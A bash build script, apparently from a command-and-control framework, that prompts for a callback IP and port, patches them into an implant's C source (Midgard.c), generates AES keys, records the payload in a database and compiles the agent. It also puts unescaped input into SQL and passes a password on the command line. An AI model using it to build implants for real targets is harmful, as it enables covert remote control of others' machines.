#!/bin/bash

# generate AES keys
KEY=$(/usr/bin/openssl rand -hex 32 | tr -d '\n')
IV=$(/usr/bin/openssl rand -hex 16 | tr -d '\n')
UUID=$(/usr/bin/cat /proc/sys/kernel/random/uuid)
TIME=$(/usr/bin/date -u +"%Y-%m-%d %H:%M:%S")
/usr/bin/sed -i "s/\(profile->compile_id = strdup(\"\)[^\"]*\(\");\)/\1$UUID\2/" Midgard.c

read -p "Enter the agent's name (Default is 'agent'): " NAME
NAME=${NAME:-agent}
read -p "Enter the architecture (Options: x86_64, aarch64; Default: 'x86_64'): " ARCH
ARCH=${ARCH:-x86_64}
read -p "Enter the callback IP (Default is 127.0.0.1): " IP
IP=${IP:-127.0.0.1}
read -p "Enter the callback port (Default is 8000): " PORT
PORT=${PORT:-8000}
read -p "Enter compile mode (Default is 'agent') {agent, pack, shelf, all}: " MODE
MODE=${MODE:-agent}
read -p "Use AES encryption? (Default is 'y') (y\n): " choice
choice=${choice:-y}
read -p "Enter the path to the Handlers directory (relative to this script) (Default is ../../Handlers): " path
path=${path:-../../Handlers}

if [[ "${choice,,}" == "y" ]]; then
    AES=1
else
    AES=0
fi

/usr/bin/sed -i "s/^\(#define HOST \"\)[^\"]*\(\"\)/\1$IP\2/" Midgard.c
/usr/bin/sed -i "s/^\(#define PORT \).*/\1$PORT/" Midgard.c
/usr/bin/sed -i "s/\(profile->aes = \).*/\1(int *)$AES;/" Midgard.c
source $path/.env
/usr/bin/sudo /usr/bin/docker exec -it mariadb mariadb -u yggdrasil -D yggdrasil -p$DB_PASS -h $DB_HOST -e "INSERT INTO payloads (compile_id, name, profile, created, use_aes, private, public) VALUES ('$UUID', '$NAME', 'Midgard', '$TIME', '$AES', '$KEY', '$IV')"
/usr/bin/make $MODE NAME=$NAME HANDLERS=$path ARCH=$ARCH